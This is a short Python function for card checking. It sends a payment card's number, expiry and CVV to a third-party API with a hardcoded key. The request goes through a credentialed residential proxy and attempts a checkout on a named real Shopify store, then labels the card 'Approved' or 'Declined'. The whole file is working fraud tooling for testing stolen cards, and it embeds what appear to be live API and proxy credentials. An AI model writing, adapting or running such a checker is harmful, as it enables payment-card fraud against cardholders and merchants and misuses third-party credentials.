import httpx

async def shopify_func(_, cc, cvv, mes, ano):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    url = "https://api.voidapi.xyz/v2/shopify_graphql"

    payload = {
        "key": "VDX-SHA2X-NZ0RS-O7HAM",
        "data": {
            "card": fullcc,
            "product_url": "https://store.longroadsociety.com/products/moses-cadillac-45?variant=12328195358784",
            "email": None,
            "proxy": "proxy.speedproxies.net:12321:uipido7851df:6691eddcc9f9_country-us",
            "ship_address": None,
            "is_shippable": False
        }
    }

    try:
        async with httpx.AsyncClient(timeout=65) as client:
            res = await client.post(url, json=payload)
            response = res.json()

            if response.get("status", "").lower() == "processedreceipt":
                return {
                    "status": "Approved ✅",
                    "response": response.get("message", "Charged successfully")
                }
            else:
                return {
                    "status": "Declined ❌",
                    "response": response.get("error", "Declined or unexpected error")
                }

    except Exception as e:
        return {
            "status": "Error",
            "response": f"Request failed: {e}"
        }